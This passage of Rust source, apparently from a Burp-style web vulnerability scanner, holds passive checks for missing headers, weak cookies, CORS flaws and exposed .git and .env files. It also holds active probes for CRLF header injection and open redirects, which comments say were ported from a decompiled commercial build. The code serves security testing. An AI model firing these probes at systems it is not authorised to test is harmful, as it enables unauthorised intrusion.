        let method_post = req.first.trim_start().to_ascii_uppercase().starts_with("POST");
        if method_post && req_body.contains("password") {
            let has_token = ["csrf", "token", "nonce", "authenticity"].iter().any(|t| req_body.contains(t));
            if !has_token {
                v.push(mk_check(CH_CSRF, e,
                    "POST body carries a password field but no anti-CSRF token field name (csrf/token/nonce/authenticity)."));
            }
        }
    }

    // Content type / charset (burp.Zf9p, PPR_MisstatedMimeType): skipped for
    // redirects; known charsets are Zf9p.ZY (runtime-dumped).
    if let Some(resp) = &e.resp_raw {
        for i in mime_issues(resp) {
            let mut issue = mk_check(i, e, match i.id {
                "passive.html-no-charset" => "The response states the content type as HTML but does not specify a character set.",
                "passive.html-unrecognized-charset" => "The response specifies a character set that is not a recognized standard one.",
                "passive.content-type-missing" => "The response does not contain a Content-Type header.",
                _ => "The response contains multiple Content-Type statements.",
            });
            issue.confidence = "Certain".into();
            v.push(issue);
        }
    }

    // OpenAPI definition found (passive scan check), burp.Zge_.
    if let Some(resp) = &e.resp_raw {
        let path = e.path.split_once("://").and_then(|(_, r)| r.find('/').map(|i| r[i..].to_string())).unwrap_or_else(|| e.path.clone());
        if crate::burp_checks::openapi_passive(&path, resp) {
            v.push(mk_check(CH_OPENAPI_PASSIVE, e, "The response contains an OpenAPI definition."));
        }
    }

    // Unencrypted communications (Burp KB): the response was served over
    // plain HTTP, so all of it is interceptable.
    if !e.https {
        // Burp raises this once per host, against the root path.
        let mut i = mk_check(CH_CLEARTEXT, e, "The site communicates over plain HTTP; traffic can be read or modified in transit.");
        i.path = "/".into();
        v.push(i);
    }

    // Frameable response (burp.Zm7y.ZL, issue burp.Zpe_: info / firm): a GET
    // answered with a non-redirect, sniffed-HTML page that carries at least
    // one URL-bearing element (burp.Zeyc) and no X-Frame-Options DENY or
    // SAMEORIGIN. A CSP frame-ancestors policy does not suppress it.
    {
        let get = req.first.trim_start().to_ascii_uppercase().starts_with("GET ");
        let redirect = p.status.starts_with('3');
        let xfo = util::get_header(&p.headers, "X-Frame-Options").unwrap_or_default();
        let blocked = xfo.trim().eq_ignore_ascii_case("deny") || xfo.trim().eq_ignore_ascii_case("sameorigin");
        if get && !redirect && html && !blocked && !burp_sniff_unknown(resp, p.head_len) && has_url_element(&low) {
            v.push(mk_check(CH_FRAME, e, "The response may be framed by another site (clickjacking risk)."));
        }
    }

    if ok_status {
        // HSTS only means anything over HTTPS.
        if e.https && !has_header(&p.headers, "Strict-Transport-Security") {
            v.push(mk_check(CH_HSTS, e,
                "No HSTS policy on an HTTPS response; downgrade and cookie-stripping attacks stay possible."));
        }
        if html {
            let csp = util::get_header(&p.headers, "Content-Security-Policy").unwrap_or_default();
            if csp.is_empty() {
                v.push(mk_check(CH_CSP, e,
                    "No Content-Security-Policy, so injected scripts are not restricted by a content policy."));
            }
            if !has_header(&p.headers, "X-Content-Type-Options") {
                v.push(mk_check(CH_XCTO, e,
                    "No nosniff directive; browsers may guess the content type."));
            }
            if !has_header(&p.headers, "Referrer-Policy") {
                v.push(mk_check(CH_REFERRER, e,
                    "No Referrer-Policy, so URLs (possibly with tokens) leak in the Referer header."));
            }
            if !has_header(&p.headers, "Permissions-Policy")
                && !has_header(&p.headers, "Feature-Policy")
            {
                v.push(mk_check(CH_PERMISSIONS, e,
                    "No Permissions-Policy; powerful browser features are left enabled for embedded content."));
            }
            if let Some(server) = util::get_header(&p.headers, "Server") {
                let discloses = server.contains('/')
                    || !server.split_whitespace().skip(1).next().unwrap_or("").is_empty();
                if discloses {
                    v.push(mk_check(CH_SERVER, e, format!("Server header: {server}")));
                }
            }
            if let Some(xpb) = util::get_header(&p.headers, "X-Powered-By") {
                v.push(mk_check(CH_XPB, e, format!("X-Powered-By header: {xpb}")));
            }
            for h in ["X-AspNet-Version", "X-AspNetMvc-Version"] {
                if let Some(val) = util::get_header(&p.headers, h) {
                    v.push(mk_check(CH_ASPNET, e, format!("{h} header: {val}")));
                }
            }
        }

        // cookies lacking flags (all Set-Cookie values; repeated headers included)
        for (k, val) in &p.headers {
            if !k.eq_ignore_ascii_case("Set-Cookie") {
                continue;
            }
            let c = parse_cookie(val);
            let secure = has_flag(&c.attrs, "secure");
            if e.https && !secure {
                v.push(mk_check(CH_COOKIE_SECURE, e, val.clone()));
            }
            if looks_session_cookie(c.name, c.value) && !has_flag(&c.attrs, "httponly") {
                v.push(mk_check(CH_COOKIE_HTTPONLY, e, val.clone()));
            }
            match attr_value(&c.attrs, "samesite") {
                None => v.push(mk_check(CH_COOKIE_SAMESITE, e, val.clone())),
                Some("none") if !secure => {
                    v.push(mk_check(CH_COOKIE_SAMESITE_NONE, e, val.clone()))
                }
                _ => {}
            }
        }

        // CORS: compare the response against the Origin that was actually sent.
        let acao = util::get_header(&p.headers, "Access-Control-Allow-Origin").unwrap_or_default();
        let acac = util::get_header(&p.headers, "Access-Control-Allow-Credentials")
            .map(|v| v.eq_ignore_ascii_case("true"))
            .unwrap_or(false);
        if acao == "*" && acac {
            v.push(mk_check(CH_CORS_WILDCARD_CREDS, e,
                "Access-Control-Allow-Origin: * with credentials (browsers reject it, but the policy is broken)."));
        } else if acao == "*" {
            v.push(mk_check(CH_CORS_WILDCARD, e,
                "Access-Control-Allow-Origin: * lets any site read the response."));
        } else if acao.eq_ignore_ascii_case("null") {
            v.push(mk_check(CH_CORS_NULL, e,
                "Access-Control-Allow-Origin: null trusts sandboxed/data: origins."));
        } else if let Some(origin) = util::get_header(&req.headers, "Origin") {
            if !acao.is_empty() && acao.eq_ignore_ascii_case(&origin) {
                if acac {
                    v.push(mk_check(CH_CORS_CREDS, e,
                        format!("Access-Control-Allow-Origin reflects {origin} and allows credentials.")));
                } else {
                    v.push(mk_check(CH_CORS_REFLECT, e,
                        format!("Access-Control-Allow-Origin reflects the caller-supplied origin {origin}.")));
                }
            }
        }

        // A redirect that hands a session cookie to a different host.
        if p.status.starts_with('3') {
            if let Some(loc) = util::get_header(&p.headers, "Location") {
                let same_host = location_host(&loc)
                    .map(|h| h == e.host.to_ascii_lowercase())
                    .unwrap_or(true);
                let session_cookie = p.headers.iter().filter(|(k, _)| k.eq_ignore_ascii_case("Set-Cookie"))
                    .any(|(_, val)| {
                        let c = parse_cookie(val);
                        looks_session_cookie(c.name, c.value)
                    });
                if !same_host && session_cookie {
                    v.push(mk_check(CH_REDIRECT_COOKIE, e,
                        format!("302 to {loc} sets a session cookie that is not scoped to the target host.")));
                }
            }
        }

        // Sensitive HTTPS response that a shared cache may store.
        if e.https {
            let cc = util::get_header(&p.headers, "Cache-Control")
                .unwrap_or_default()
                .to_ascii_lowercase();
            let set_cookie = p.headers.iter().any(|(k, _)| k.eq_ignore_ascii_case("Set-Cookie"));
            let sensitive = set_cookie
                || low.contains("\"token\"")
                || low.contains("password")
                || low.contains("api_key");
            let cacheable = cc.is_empty() || (cc.contains("public") && !cc.contains("no-store"));
            if sensitive && cacheable {
                v.push(mk_check(CH_CACHE, e,
                    "Sensitive HTTPS response without Cache-Control: no-store/private."));
            }
        }
    }

    if !binary {
        // error / stack-trace signatures in the response body
        for (sig, name) in ERROR_SIGNATURES {
            if body.windows(sig.len()).any(|w| w.eq_ignore_ascii_case(sig.as_bytes())) {
                v.push(mk("medium", name, e, format!("Signature matched: {sig}")));
            }
        }
        // secrets in HTML comments
        let mut start = 0;
        while let Some(copen) = text[start..].find("<!--") {
            let cstart = start + copen + 4;
            let Some(cend) = text[cstart..].find("-->") else { break };
            let comment = &text[cstart..cstart + cend];
            for (kw, name) in SECRET_KEYWORDS {
                if comment.to_ascii_lowercase().contains(&kw.to_ascii_lowercase()) {
                    v.push(mk("info", name, e, comment.trim().chars().take(120).collect::<String>()));
                }
            }
            start = cstart + cend + 3;
        }
        // exposed metadata / backup files
        if ok_status {
            let path = e.path.to_ascii_lowercase();
            if (path.contains("/.git/") || path.ends_with("/.git"))
                && (text.contains("[core]") || text.contains("ref: refs/"))
            {
                v.push(mk_check(CH_GIT, e,
                    "Git metadata served by the web root (repository layout and history are exposed)."));
            }
            let env_path = path.ends_with("/.env") || path.contains("/.env?");
            if env_path && (text.contains("APP_KEY=") || text.contains("DB_PASSWORD=") || text.contains("SECRET_KEY=")) {
                v.push(mk_check(CH_ENV, e,
                    "Environment file served by the web root (secrets and credentials are exposed)."));
            }
            if html
                && (low.contains("<title>index of") || low.contains("<h1>index of")
                    || low.contains("directory listing for"))
            {
                v.push(mk_check(CH_DIR_LISTING, e,
                    "The server returns a directory index instead of refusing the request."));
            }
            if path.ends_with("/robots.txt") {
                v.push(mk_check(CH_ROBOTS, e,
                    "robots.txt is reachable; its Disallow entries map the hidden parts of the site."));
            }
        }
        if !text.is_empty() {
            // burp.Zbz9: an unknown sniffed MIME limits the search to the headers.
            let head_text;
            let text: &str = if burp_sniff_unknown(resp, p.head_len) {
                head_text = String::from_utf8_lossy(&resp[..p.head_len.min(resp.len())]).into_owned();
                &head_text
            } else {
                &text
            };
            if let Some(addr) = find_email_excluding(text, &String::from_utf8_lossy(&e.req_raw)) {
                v.push(mk_check(CH_EMAIL, e, format!("Address found in the response: {addr}")));
            }
            if let Some(ip) = find_private_ip(text) {
                v.push(mk_check(CH_PRIVATE_IP, e, format!("Address found in the response: {ip}")));
            }
            if let Some(card) = find_card(text) {
                v.push(mk_check(CH_CREDIT_CARD, e, format!("Luhn-valid number found in the response: {card}")));
            }
        }
    }

    if html {
        // mixed content: an HTTPS document pulling subresources over HTTP
        let mixed = ["script", "iframe", "img", "source", "video", "audio"]
            .iter()
            .flat_map(|t| tags(&low, *t))
            .find(|t| t.contains("http://"));
        let mixed_link = tags(&low, "link")
            .into_iter()
            .find(|t| t.contains("stylesheet") && t.contains("http://"));
        if e.https {
            if let Some(tag) = mixed.or(mixed_link) {
                v.push(mk_check(CH_MIXED, e,
                    format!("HTTPS page loads a subresource over HTTP: {}", tag.trim())));
            }
        }
        // login form posted in clear text
        if has_password_input(&low) {
            let forms = tags(&low, "form");
            let http_action = forms
                .iter()
                .find(|t| t.contains("action=\"http://") || t.contains("action='http://"));
            let relative_action = !e.https
                && forms
                    .iter()
                    .any(|t| !t.contains("action=\"http") && !t.contains("action='http"));
            if let Some(tag) = http_action {
                v.push(mk_check(CH_LOGIN_HTTP, e,
                    format!("Password form submits over HTTP: {}", tag.trim())));
            } else if relative_action {
                v.push(mk_check(CH_LOGIN_HTTP, e,
                    "Password form on a plain-HTTP page submits its credentials unencrypted."));
            }
            // password field with autocomplete enabled
            let weak = tags(&low, "input").into_iter().find(|t| {
                (t.contains("type=\"password\"") || t.contains("type='password'"))
                    && !(t.contains("autocomplete=\"off\"")
                        || t.contains("autocomplete='off'")
                        || t.contains("autocomplete=\"new-password\"")
                        || t.contains("autocomplete='new-password'"))
            });
            if let Some(tag) = weak {
                v.push(mk_check(CH_AUTOCOMPLETE, e, tag.trim().to_string()));
            }
        }
    }
    v
}

pub fn query_params(path: &str) -> Vec<(String, String)> {
    let q = path.split('?').nth(1).unwrap_or("");
    q.split('&')
        .filter(|s| !s.is_empty())
        .map(|kv| {
            let mut it = kv.splitn(2, '=');
            (it.next().unwrap_or("").to_string(), it.next().unwrap_or("").to_string())
        })
        .take(MAX_INSERTION_POINTS)
        .collect()
}

/// Active scan of a stored request. Builds the insertion points under the
/// scan configuration (Burp's builder, vetoes and cap, see [`audit_points`]),
/// then on a
/// worker thread fetches the baseline and runs the check registries of
/// [`checks`]: every insertion-point check on every point, in registry
/// order, then the per-request and per-host checks once.
///
/// `oob` carries one Collaborator payload per slot of [`oob_slots`]
/// (slot, token, payload): the payload replaces the value and the
/// interaction itself is detected asynchronously by
/// [`match_oob_interactions`] against `Shared::oob_pending`. Burp family:
/// SCANNER_ACTIVE_CHECKS_EXTERNAL_INTERACTION.
///
/// `smtp` carries, per parameter, the two Collaborator ids for Burp's SMTP
/// header injection check (simple and `>`-enclosed payloads, burp.Zrok).
/// It is empty unless a public Collaborator (interactsh) is active, as Burp
/// runs the check only with Collaborator enabled (burp.Zgcg.Zw: Za.Ze()).
pub fn start_active_scan(shared: Arc<Shared>, entry: HistEntry, oob: &[(String, String, String)], smtp: &[SmtpOob]) {
    if shared.scan.is_busy() {
        shared.log("Scanner: a scan is already running");
        return;
    }
    let req = String::from_utf8_lossy(&entry.req_raw).into_owned();
    let parts = util::parse_http(&entry.req_raw);
    let host_header = util::get_header(&parts.headers, "Host").unwrap_or_default();
    if host_header.is_empty() {
        shared.log("Scanner: selected request has no Host header");
        return;
    }
    let (host, port) = net::split_h_p(&host_header, entry.port);
    let config = shared.scan_config.lock().unwrap().clone();
    let points: Vec<InsertionPoint> = audit_points(&req, &config);
    if points.is_empty() {
        // Burp still runs its per-request and per-host checks (CORS,
        // path-relative style sheets, OpenAPI discovery) on such requests.
        shared.log("Scanner: no query parameters; running per-request and per-host checks only");
    }
    // Claim the scanner before touching its progress: a refused second
    // scan must not reset the running one's counters.
    let Some(guard) = crate::scan_run::try_claim(&shared) else {
        shared.log("Scanner: a scan is already running");
        return;
    };
    shared.scan.total.store(planned_progress(&entry, points.len(), oob.len()), Ordering::SeqCst);
    shared.scan.done.store(0, Ordering::SeqCst);
    shared.scan.stop.store(false, Ordering::SeqCst);
    shared.scan.direct.store(shared.scan.running_task.load(Ordering::SeqCst) == 0, Ordering::SeqCst);
    shared.log(&format!("Scanner: active scan started ({} insertion point(s), light active checks)", points.len()));

    let settings = checks::Settings {
        speed: ScanSpeed::from_u8(shared.scan_speed.load(Ordering::SeqCst)),
        accuracy: crate::variations::Accuracy::from_u8(shared.scan_accuracy.load(Ordering::SeqCst)),
    };
    let (oob, smtp) = (oob.to_vec(), smtp.to_vec());
    std::thread::spawn(move || {
        let _tool = crate::net::tool_scope("Scanner");
        // The guard releases the scanner however this thread ends: a
        // panicking check used to leave it claimed, so every later scan was
        // refused and the task runner waited forever.
        let _guard = guard;
        let run = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
            let cx = checks::ScanCtx::start(shared.clone(), entry, req, parts, host, port, settings, oob, smtp);
            checks::run_point_checks(&cx, &points);
            checks::run_request_checks(&cx);
        }));
        if let Err(e) = run {
            let why = e.downcast_ref::<&str>().map(|s| s.to_string()).or_else(|| e.downcast_ref::<String>().cloned()).unwrap_or_default();
            shared.log(&format!("Scanner: the scan stopped on an internal error: {why}"));
            crate::notice::toast(crate::notice::Level::Error, format!("Active scan stopped on an internal error: {why}"));
            return;
        }
        drop(_guard);
        let shared = &shared;
        shared.log("Scanner: active scan finished");
        let found = shared.issues.lock().map(|i| i.len()).unwrap_or(0);
        crate::notice::toast(
            crate::notice::Level::Success,
            format!("Active scan finished — {found} issue(s) in the report"),
        );
    });
}

/// The progress bar's total for a scan: fifteen probes per insertion point,
/// one baseline, one oob probe per payload, the scan-level probes, the
/// stored-echo pass, up to eight CORS origins and the per-host OpenAPI
/// paths, plus up to three CSRF variants (remove / empty / static token)
/// when the request qualifies. An estimate; checks advance it as they go.
fn planned_progress(entry: &HistEntry, points: usize, oob: usize) -> usize {
    let total = points * 15 + 1 + oob + 5 + 8 + crate::burp_checks::openapi_paths(false).len();
    let csrf_parts = util::parse_http(&entry.req_raw);
    let csrf_ct = util::get_header(&csrf_parts.headers, "Content-Type").unwrap_or_default();
    let csrf_body = String::from_utf8_lossy(&entry.req_raw[csrf_parts.head_len.min(entry.req_raw.len())..]).into_owned();
    let csrf_total = if csrf_applicable(&csrf_parts.method, &csrf_ct, &csrf_parts.headers)
        && csrf_ct.to_ascii_lowercase().contains("x-www-form-urlencoded")
        && !csrf_body.trim().is_empty()
        && !strip_csrf_params(&csrf_body).1.is_empty()
    {
        3
    } else {
        0
    };
    total + csrf_total
}

/// True when the injected marker (and the raw quote/angle brackets around it)
/// come back in the response without HTML/URL encoding.
// ================= HTTP response header injection (burp.Zwi) =================

/// The raw header lines of a response (status line excluded), split on CR,
/// LF or CRLF, so a bare CR or LF injected by the probe is visible too.
/// Burp's "Crawl and audit": crawl from each start URL, then audit every
/// auditable item found (passive checks, then the active scan), one at a
/// time. Blocks until done; call from a worker thread.
/// Actively audit these items one after another on a background thread
/// (Burp's "Actively scan this host / branch"). Stops when the scan is
/// stopped; draws Collaborator payloads from the pool like Crawl & Audit.
pub fn audit_entries(shared: Arc<Shared>, entries: Vec<HistEntry>) {
    // Queued as a Dashboard task: it runs after any scan already queued and
    // can be paused, resumed and cancelled there.
    let name = match entries.as_slice() {
        [one] => format!("Active scan of {}{}", net::history_host(one), one.path),
        many => format!("Active scan of {} items", many.len()),
    };
    crate::tasks::enqueue(&shared, name, crate::tasks::TaskKind::Audit(entries));
}

/// One pre-minted Collaborator payload per out-of-band slot of this request,
/// taken from the pool (a front end with a Collaborator stocks it; a headless
/// run has none). When the pool runs short the remaining slots get none and
/// the scan log says so: those out-of-band checks are skipped, not silently.
pub fn pooled_oob(shared: &Shared, req_raw: &[u8]) -> Vec<(String, String, String)> {
    let slots = oob_slots(shared, req_raw);
    if slots.is_empty() {
        return Vec::new();
    }
    // Wake the front end now so it stocks the pool on its next frame.
    shared.wake();
    let ids = shared.oob.take(slots.len(), std::time::Duration::from_millis(1500));
    if ids.len() < slots.len() && !ids.is_empty() {
        shared.log(&format!("Scanner: only {} of {} Collaborator ids available; {} out-of-band probe(s) skipped", ids.len(), slots.len(), slots.len() - ids.len()));
    }
    slots.into_iter().zip(ids).map(|(slot, (token, dns))| (slot, token, dns)).collect()
}

pub fn crawl_and_audit(shared: &Arc<Shared>, start_urls: &[String], audit_only: bool) {
    let _tool = crate::net::tool_scope("Scanner");
    // Ask the UI thread for Collaborator payloads for the whole run, so the
    // out-of-band checks work here as they do for a scan started on one item.
    struct Wanted<'a>(&'a Shared);
    impl Drop for Wanted<'_> {
        fn drop(&mut self) {
            self.0.oob.want(false);
        }
    }
    shared.oob.want(true);
    let _wanted = Wanted(shared);
    reset_openapi_hosts();
    for url in start_urls {
        let mut items = if audit_only {
            crate::crawl::crawl_single(shared, url)
        } else {
            crate::crawl::crawl(shared, url)
        };
        // Browser-driven crawl (Burp's crawler drives Chromium): picks up
        // client-side routes and the API calls pages make; each observed
        // same-origin request is re-issued as a crawl item.
        let engine = shared.scan_config.lock().unwrap().crawl.engine.clone();
        if !audit_only && !engine.is_empty() && !engine.eq_ignore_ascii_case("chromium") {
            // Another headless engine (headless.rs): render through the
            // proxy, then fetch each page it found as a crawl item.
            match crate::headless::pick(Some(&engine)) {
                Some(eng) => match crate::headless::js_crawl(eng.as_ref(), shared, url) {
                    Ok(urls) => {
                        shared.log(&format!("{} crawl of {url}: {} page(s)", eng.name(), urls.len()));
                        let mut keys: std::collections::BTreeSet<String> = items.iter().map(|e| format!("{} {}", e.method, crate::crawl::location_key(&e.path))).collect();
                        for u in urls {
                            for it in crate::crawl::crawl_single(shared, &u) {
                                if keys.insert(format!("{} {}", it.method, crate::crawl::location_key(&it.path))) {
                                    items.push(it);
                                }
                            }
                        }
                    }
                    Err(e) => shared.log(&format!("{} crawl unavailable ({e}); static crawl only", eng.name())),
                },
                None => shared.log(&format!("Headless engine {engine} is not installed; static crawl only")),
            }
        } else if !audit_only {
            match crate::crawl::browser_crawl(shared, url) {
                Ok(mut seen) => {
                    shared.log(&format!("Browser crawl of {url}: {} request(s) observed", seen.len()));
                    // Per location, prefer an exchange whose response the
                    // browser itself received (what Burp audits passively): a
                    // replay of a stateful request, such as a socket.io poll
                    // with a stale sid, gets a different answer.
                    seen.sort_by_key(|r| r.resp_head.is_none() || r.resp_body.is_none());
                    let mut keys: std::collections::BTreeSet<String> =
                        items.iter().map(|e| format!("{} {}", e.method, crate::crawl::location_key(&e.path))).collect();
                    // Only the start origin is crawled and audited, whatever
                    // the browser was led to request.
                    let start = crate::crawl::origin_of(url).unwrap_or_default();
                    for r in seen.into_iter().filter(|r| crate::crawl::same_origin(&r.url, &start)) {
                        let path = r.url.split_once("://").and_then(|(_, x)| x.find('/').map(|i| x[i..].to_string())).unwrap_or_else(|| "/".into());
                        let path = path.split('#').next().unwrap_or("/").to_string();
                        if keys.insert(format!("{} {}", r.method, crate::crawl::location_key(&path))) {
                            items.push(crate::crawl::replay_seen(shared, &r));
                        }
                    }
                }
                Err(e) => shared.log(&format!("Browser crawl unavailable ({e}); static crawl only")),
            }
        }
        shared.log(&format!("Crawl of {url}: {} item(s)", items.len()));
        shared.add_crawl_items(items.iter().cloned());
        let static_refs = crate::crawl::static_reference_corpus(&items);
        for e in items.into_iter().filter(|e| crate::crawl::auditable(e) || crate::crawl::referenced_static(e, &static_refs)) {
            if shared.scan.stop.load(Ordering::SeqCst) {
                return;
            }
            add_passive_issues(shared, passive_check(&e));
            let oob = pooled_oob(shared, &e.req_raw);
            start_active_scan(shared.clone(), e, &oob, &[]);
            // start_active_scan claims the scanner before it returns.
            shared.scan.wait_idle(None);
        }
    }
    shared.log("Crawl and audit finished");
}

/// Hosts already probed by the per-host OpenAPI check this session (Burp runs
/// APH_ checks once per host).
pub(crate) fn reset_openapi_hosts() {
    openapi_hosts().lock().unwrap().clear();
    checks::everywhere_hosts().lock().unwrap().clear();
}

fn openapi_hosts() -> &'static std::sync::Mutex<std::collections::HashSet<String>> {
    static H: std::sync::OnceLock<std::sync::Mutex<std::collections::HashSet<String>>> = std::sync::OnceLock::new();
    H.get_or_init(|| std::sync::Mutex::new(std::collections::HashSet::new()))
}

fn raw_header_lines(resp: &[u8]) -> Vec<String> {
    let end = resp.windows(4).position(|w| w == b"\r\n\r\n").unwrap_or(resp.len());
    let head = String::from_utf8_lossy(&resp[..end]).into_owned();
    head.split(['\r', '\n']).skip(1).filter(|l| !l.is_empty()).map(str::to_string).collect()
}

/// burp.Zwi.ZL precondition: the value is reflected into a response header.
fn reflected_in_headers(resp: &[u8], marker: &str) -> bool {
    raw_header_lines(resp).iter().any(|l| l.contains(marker))
}

pub(crate) struct HeaderInjectionHit {
    pub payload: String,
    pub injected_line: String,
}

/// burp.Zwi: applies when the value is reflected into a response header,
/// tried as replace then append (Zwe8.REPLACE/APPEND). The separators decoded
/// from Zwi.Zy are CRLF, CR and LF, each raw, %xx-encoded (Zw9s.Zi) and
/// NUL-prefixed (Zw9s.Ze mode 2). The payload is a 10-char random string
/// split 5+5 around the separator. A hit is a response header line that
/// begins with the second half (burp.Zfpy).
pub(crate) fn run_header_injection_check<F: FnMut(&str) -> Option<Vec<u8>>>(value: &str, mut send: F) -> Option<HeaderInjectionHit> {
    let rnd = || {
        use rand::Rng;
        let mut g = rand::thread_rng();
        (0..10).map(|_| (b'a' + g.gen_range(0..26)) as char).collect::<String>()
    };
    for append in [false, true] {
        let marker = rnd();
        let probe = if append { format!("{value}{marker}") } else { marker.clone() };
        if !send(&probe).is_some_and(|r| reflected_in_headers(&r, &marker)) {
            continue;
        }
        for sep in ["\r\n", "\r", "\n"] {
            for enc in 0..3 {
                let r = rnd();
                let s = match enc {
                    1 => zw9s_encode(sep),
                    2 => format!("\0{sep}"),
                    _ => sep.to_string(),
                };
                let inj = format!("{}{s}{}", &r[..5], &r[5..]);
                let payload = if append { format!("{value}{inj}") } else { inj };
                let Some(resp) = send(&payload) else { continue };
                if let Some(line) = raw_header_lines(&resp).into_iter().find(|l| l.starts_with(&r[5..])) {
                    return Some(HeaderInjectionHit { payload, injected_line: line });
                }
            }
        }
    }
    None
}

// ================= Open redirection (burp.Zuag) =================

/// Redirect targets in a response, as Burp's redirect sinks see them:
/// burp.Zxzj (3xx `Location`, or a `Refresh` header's `url=`), burp.Zgi5
/// (`<meta http-equiv="refresh" content="...url=...">`). Sink literals were
/// decoded with Burp's own string decoder.
pub(crate) fn redirect_targets(resp: &[u8]) -> Vec<String> {
    let p = util::parse_http(resp);
    let mut out = Vec::new();
    let status: u16 = p.status.trim().parse().unwrap_or(0);
    if (300..400).contains(&status) {
        if let Some(l) = util::get_header(&p.headers, "location") {
            out.push(l.trim().to_string());
        }
    }
    let after_url = |s: &str| -> Option<String> {
        let low = s.to_ascii_lowercase();
        low.find("url=").map(|i| s[i + 4..].trim().trim_matches(|c| c == '"' || c == '\'').to_string())
    };
    if let Some(r) = util::get_header(&p.headers, "refresh").and_then(|r| after_url(&r)) {
        out.push(r);
    }
    let body = String::from_utf8_lossy(&resp[p.head_len.min(resp.len())..]).into_owned();
    let low = body.to_ascii_lowercase();
    let mut i = 0;
    while let Some(m) = low[i..].find("<meta").map(|x| x + i) {
        let end = low[m..].find('>').map(|x| x + m).unwrap_or(low.len());
        let tag = &body[m..end];
        let tl = &low[m..end];
        if tl.contains("http-equiv") && tl.contains("refresh") {
            if let Some(ci) = tl.find("content") {
                if let Some(u) = after_url(&tag[ci..]) {
                    out.push(u.trim_end_matches(['"', '\'', '/', ' ']).to_string());
                }
            }
        }
        i = end.max(m + 5);
    }
    out
}

/// burp.Zsyu: a reflection is a script redirect when the letters in the 30
/// chars before it, lower-cased, end with one of Burp's sink names.
pub(crate) fn js_redirect_at(body: &str, pos: usize) -> bool {
    let start = pos.saturating_sub(30);
    let letters: String = body
        .get(start..pos)
        .unwrap_or("")
        .chars()
        .filter(|c| c.is_alphabetic())
        .collect::<String>()
        .to_lowercase();
    ["documentlocation", "documenturl", "windowopen", "windownavigate", "locationhref"]
        .iter()
        .any(|s| letters.ends_with(s))
}

/// The redirect target in `resp` that contains `needle`, as (target, offset
/// of the needle). Script sinks yield the body from the reflection onwards.
pub(crate) fn redirect_target_with(resp: &[u8], needle: &str) -> Option<(String, usize)> {
    let nl = needle.to_lowercase();
    for t in redirect_targets(resp) {
        if let Some(i) = t.to_lowercase().find(&nl) {
            return Some((t, i));
        }
    }
    let p = util::parse_http(resp);
    let body = String::from_utf8_lossy(&resp[p.head_len.min(resp.len())..]).into_owned();
    let low = body.to_lowercase();
    let mut from = 0;
    while let Some(i) = low.get(from..).and_then(|s| s.find(&nl)).map(|x| x + from) {
        if js_redirect_at(&body, i) {
            return Some((body[i..].to_string(), 0));
        }
        from = i + 1;
    }
    None
}

/// burp.Zuag.Zq: the probe hits when some redirect target starts with the
/// expected prefix (case-insensitive).
pub(crate) fn redirects_to(resp: &[u8], expected: &str) -> bool {
    redirect_target_with(resp, expected).is_some_and(|(t, i)| i == 0 && t.to_lowercase().starts_with(&expected.to_lowercase()))
}

/// burp.Zw9s.Zi: letters and digits kept, every other char as %xx.
pub(crate) fn zw9s_encode(s: &str) -> String {
    s.chars()
        .map(|c| if c.is_alphanumeric() { c.to_string() } else { format!("%{:02x}", (c as u32) & 0xff) })
        .collect()
}

pub(crate) struct RedirectHit {
    pub payload: String,
    pub target: String,
}

/// burp.Zuag.Zw: applies only when the value is reflected into a redirect
/// target (appended first, then replaced, burp.Zuag.Zx). Then, in Burp's
/// order: the domain-suffix attack when the value sits right after a host
/// (ZG), `http://a<r>/a?<value>` and `https://` (and `Http://` at THOROUGH)
/// (ZE), the same host with `.a<r>` when the value is an absolute URL (ZR),
/// and the `//a`, `/\a`, `\\a` prefixes raw and %-encoded (ZV, Zuag.Zl).
/// Every payload replaces the value; `r` is 10 random chars.
pub(crate) fn run_open_redirect_check<F: FnMut(&str) -> Option<Vec<u8>>>(
    value: &str,
    speed: ScanSpeed,
    mut send: F,
) -> Option<RedirectHit> {
    let rnd = || {
        use rand::Rng;
        let mut g = rand::thread_rng();
        (0..10).map(|_| (b'a' + g.gen_range(0..26)) as char).collect::<String>()
    };
    // reflection into a redirect sink (Zw7s APPEND, then REPLACE)
    let marker = rnd();
    let appended = send(&format!("{value}{marker}")).and_then(|r| redirect_target_with(&r, &marker));
    let replaced = send(&marker).and_then(|r| redirect_target_with(&r, &marker));
    if appended.is_none() && replaced.is_none() {
        return None;
    }
    let mut attempt = |payload: String, expected: String| -> Option<RedirectHit> {
        let r = send(&payload)?;
        redirects_to(&r, &expected).then(|| RedirectHit { target: redirect_target_with(&r, &expected).map(|t| t.0).unwrap_or_default(), payload })
    };
    // ZG: value reflected right after a scheme/host
    if let Some((target, at)) = &replaced {
        let prefix = &target[..*at];
        let lp = prefix.to_lowercase();
        if lp.starts_with("http://") || lp.starts_with("https://") {
            let host_at = prefix.find("//").map(|i| i + 2).unwrap_or(prefix.len());
            let more = prefix[host_at..].contains('/') || prefix[host_at..].contains('?');
            if !more {
                let bare = lp == "http://" || lp == "https://";
                let mut p = if bare { rnd() } else { format!(".a{}", rnd()) };
                if target.len() > at + marker.len() {
                    p.push('/');
                }
                if let Some(h) = attempt(p.clone(), format!("{prefix}{p}")) {
                    return Some(h);
                }
            }
        }
    }
    // ZE
    let mut schemes = vec![("http://a", value), ("https://a", value)];
    if speed >= ScanSpeed::Thorough {
        schemes.push(("Http://a", ""));
    }
    for (scheme, orig) in schemes {
        let base = format!("{scheme}{}/", rnd());
        if let Some(h) = attempt(format!("{base}a?{orig}"), base) {
            return Some(h);
        }
    }
    // ZR
    let lv = value.to_lowercase();
    if lv.starts_with("http:") || lv.starts_with("https://") {
        if let Some((proto, rest)) = value.split_once("://") {
            let (host, file) = rest.find('/').map(|i| (&rest[..i], &rest[i..])).unwrap_or((rest, ""));
            let host = host.split(':').next().unwrap_or(host);
            let base = format!("{proto}://{host}.a{}", rnd());
            if let Some(h) = attempt(format!("{base}{file}"), base) {
                return Some(h);
            }
        }
    }
    // ZV
    for prefix in ["//a", "/\\a", "\\\\a"] {
        for enc in [false, true] {
            let base = format!("{prefix}{}/", rnd());
            let raw = format!("{base}a?{value}");
            let payload = if enc { zw9s_encode(&raw) } else { raw };
            if let Some(h) = attempt(payload, base) {
                return Some(h);
            }
        }
    }
    None
}

// ================= FILE_PATH_TRAVERSAL / XXE file-read engine =================
//
// Ported from Burp build 52685's own check classes, not just its family name.
// Control flow comes from the decompiled tree (burp.Zp3a = FilePathTraversalCheck,
// burp.Zscp = payload generator, burp.Zw_c = file-content matcher,
